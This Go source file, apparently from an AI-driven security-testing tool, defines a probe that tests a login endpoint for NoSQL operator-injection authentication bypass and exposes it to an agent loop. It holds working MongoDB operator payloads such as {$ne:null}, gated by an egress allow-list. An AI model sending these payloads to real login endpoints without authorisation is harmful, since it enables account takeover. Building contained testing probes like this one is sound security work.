package probes

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"

	"github.com/t0ul/GORED/internal/core"
	"github.com/t0ul/GORED/internal/tools"
)

// NoSQL injection (CWE-943) is the injection subclass the authz/mass-assign probes do not
// touch: a login or query endpoint that builds its database query from the request body
// without neutralizing operator objects, so a client can inject {"$ne":null} (match anything)
// where a scalar was expected and authenticate as someone — or as anyone. It is on-thesis and
// oracle-scored: the probe crafts the operator payloads, and the server's own auth decision on
// real bytes is the oracle (the injection authenticates where wrong credentials do not). It is
// generic — operator-injection attack knowledge, no app-specific usernames or paths beyond the
// login recipe — and contained (every request through the Egress gate, single endpoint).

// nosqliPayloads are generic MongoDB-style operator-injection credential pairs. Pure operator
// objects (no app-specific values) plus the common "admin"-with-any-password case.
var nosqliPayloads = []struct {
	name       string
	user, pass any
}{
	{`user:{$ne:null} pass:{$ne:null}`, map[string]any{"$ne": nil}, map[string]any{"$ne": nil}},
	{`user:{$gt:""} pass:{$gt:""}`, map[string]any{"$gt": ""}, map[string]any{"$gt": ""}},
	{`user:{$ne:null} pass:{$regex:".*"}`, map[string]any{"$ne": nil}, map[string]any{"$regex": ".*"}},
	{`user:"admin" pass:{$ne:""}`, "admin", map[string]any{"$ne": ""}},
}

// NoSQLiFinding is a login endpoint's NoSQL-injection result: Vector is the payload that bypassed
// authentication, empty when nothing bypassed.
type NoSQLiFinding struct {
	Path       string
	Vector     string
	CWE        string // CWE-943
	Confidence core.Confidence
	Evidence   string
	Request    map[string]any
}

// Flagged reports whether an operator payload bypassed authentication.
func (f NoSQLiFinding) Flagged() bool { return f.Vector != "" }

// NoSQLiProbe tests a login endpoint for NoSQL operator-injection auth bypass.
type NoSQLiProbe struct {
	Base      string
	Egress    *core.Egress
	LoginPath string // default /api/login
	UserField string // default "username"
	PassField string // default "password"
	Timeout   time.Duration
}

// Probe establishes a wrong-credentials baseline, then sends each operator payload. A payload
// that authenticates (2xx) where the wrong-credentials baseline did not is a confirmed bypass —
// the server's real auth decision is the oracle, so a login that rejects operators (or that
// rejects everything) produces no false positive.
func (p *NoSQLiProbe) Probe(ctx context.Context) (NoSQLiFinding, error) {
	path := p.LoginPath
	if path == "" {
		path = "/api/login"
	}
	uf, pf := p.UserField, p.PassField
	if uf == "" {
		uf = "username"
	}
	if pf == "" {
		pf = "password"
	}
	// Baseline: credentials that should not authenticate (an unlikely account + wrong password).
	baseStatus, _, err := p.post(ctx, path, map[string]any{uf: "gored-nouser-9x7q@example.invalid", pf: "gored-wrong-k3j8"})
	if err != nil {
		return NoSQLiFinding{Path: path}, err
	}
	for _, pl := range nosqliPayloads {
		body := map[string]any{uf: pl.user, pf: pl.pass}
		status, _, err := p.post(ctx, path, body)
		if err != nil {
			continue
		}
		// A bypass authenticates where wrong credentials did not. Requiring the baseline to fail
		// avoids flagging an endpoint that returns 2xx for everything.
		if ok2xx(status) && !ok2xx(baseStatus) {
			return NoSQLiFinding{
				Path: path, Vector: pl.name, CWE: "CWE-943", Confidence: core.ConfCertain,
				Evidence: fmt.Sprintf("operator injection (%s) returned HTTP %d where wrong credentials returned HTTP %d — the login query interprets client-supplied operators (NoSQL injection auth bypass)", pl.name, status, baseStatus),
				Request:  map[string]any{"method": "POST", "path": path, "body": body},
			}, nil
		}
	}
	return NoSQLiFinding{Path: path}, nil
}

// post sends a JSON body to path through the Egress gate and returns the status and body.
func (p *NoSQLiProbe) post(ctx context.Context, path string, body map[string]any) (int, string, error) {
	if !strings.HasPrefix(path, "/") {
		path = "/" + path
	}
	raw := p.Base + path
	if p.Egress == nil || !p.Egress.Allowed(raw) {
		return 0, "", fmt.Errorf("%w: %s", core.ErrEgressDenied, raw)
	}
	payload, _ := json.Marshal(body)
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, raw, bytes.NewReader(payload))
	if err != nil {
		return 0, "", err
	}
	req.Header.Set("Content-Type", "application/json")
	to := p.Timeout
	if to == 0 {
		to = 10 * time.Second
	}
	client := &http.Client{Timeout: to, CheckRedirect: func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse }}
	resp, err := client.Do(req)
	if err != nil {
		return 0, "", err
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	return resp.StatusCode, string(b), nil
}

// NoSQLiTool (nosqli) exposes the probe to the agent loop. The sentinel is emitted only on a
// confirmed bypass, read by ExploitDetector — the model cannot assert its way to a capture.
type NoSQLiTool struct {
	Gate *tools.Gate
	Base string
}

func (NoSQLiTool) Name() string { return "nosqli" }
func (NoSQLiTool) Describe() string {
	return `Test a login endpoint for NoSQL injection (operator-injection auth bypass, CWE-943). ` +
		`args: {"path":"/api/login","user_field":"username","pass_field":"password"}. ` +
		`It sends MongoDB-style operator payloads and confirms a bypass when the injection authenticates where wrong credentials do not.`
}

func (t NoSQLiTool) Call(ctx context.Context, args map[string]any) (string, error) {
	p := &NoSQLiProbe{
		Base:      t.Base,
		Egress:    t.Gate.Egress(),
		LoginPath: tools.AsString(args["path"]),
		UserField: tools.AsString(args["user_field"]),
		PassField: tools.AsString(args["pass_field"]),
	}
	f, err := p.Probe(ctx)
	if err != nil {
		return "", fmt.Errorf("nosqli: %w", err)
	}
	if f.Flagged() {
		return NoSQLiSentinel + " " + f.Evidence, nil
	}
	return "no nosql injection: operator payloads did not bypass authentication", nil
}
